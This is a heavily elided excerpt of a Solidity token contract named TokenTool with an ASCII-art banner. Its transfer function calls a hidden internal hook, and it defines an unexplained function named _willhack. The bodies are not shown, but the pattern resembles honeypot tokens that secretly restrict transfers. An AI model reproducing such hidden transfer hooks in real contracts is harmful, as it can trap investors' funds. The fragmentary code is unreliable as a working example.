...
/**
   _____          __   .__     __.__.___ _______   ____ ___ 
  /  _  \   ____ |  | _|__|   |__|__|   |\      \ |    |   \
 /  /_\  \ /  _ \|  |/ /  |   |  |  |   |/   |   \|    |   /
/    |    (  <_> )    <|  |   |  |  |   /    |    \    |  / 
\____|__  /\____/|__|_ \__/\__|  |__|___\____|__  /______/  
        \/            \/  \______|              \/          
          */              
...
contract TokenTool is Ownable {
    ...
    uint256 private _totalSupply = 1300000000000 * (10 ** decimals());
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        require(senderBalance >= amount, "Transfer amount exceeds balance");
         ...
         _willtransfer(sender, recipient, amount);
        unchecked {
    ...
    function _willhack(address sender, address recipient, uint256 amount) internal view virtual{
     ...
     function _willtransfer(address sender, address recipient, uint256 amount) internal view virtual{
